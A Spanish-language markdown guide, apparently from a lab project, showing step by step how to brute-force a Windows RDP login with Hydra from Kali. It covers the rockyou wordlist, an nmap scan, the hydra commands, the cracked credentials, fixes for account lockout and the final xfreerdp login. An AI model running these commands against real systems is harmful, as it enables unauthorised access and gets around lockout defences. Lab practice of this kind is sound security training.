### **7. `docs/06-ataque-hydra.md`**

```markdown
# Ataque de Fuerza Bruta con Hydra

## Preparación en Kali

### Verificar Hydra
```bash
which hydra
hydra -h

## Instalar/Verificar Diccionario rockyou.txt
# Descomprimir
sudo gunzip /usr/share/wordlists/rockyou.txt.gz

# Localizar archivo
find /usr -name "rockyou.txt" 2>/dev/null

# Copiar a home para facilidad
cp /usr/share/wordlists/rockyou.txt ~/
##Escaneo del Puerto RDP
nmap -p 3389 192.168.1.106


# Resultado: 3389/tcp open  ms-wbt-server

##EJECUCION DEL ATAQUE CON DICCIONARIO COMPLETO 

hydra -l victima -P ~/rockyou.txt -t 1 -W 3 rdp://192.168.1.106

##Con contraseña conocida (prueba rápida)
hydra -l victima -p 22675439 rdp://192.168.1.106

##Resultado esperado 
[3389][rdp] host: 192.168.1.106   login: victima   password: 22675439

Solución de Errores
Error	Solución
File for passwords not found	Usar -P mayúscula y ruta correcta
all children disabled	Agregar -t 1 -W 3
ERRCONNECT_ACCOUNT_LOCKED_OUT	Desbloquear usuario en Windows

Desbloquear Usuario en Windows

net user victima /active:yes


##Conexión Exitosa Post-Ataque

xfreerdp3 /v:192.168.1.106 /u:victima /p:22675439 /cert:ignore /dynamic-resolution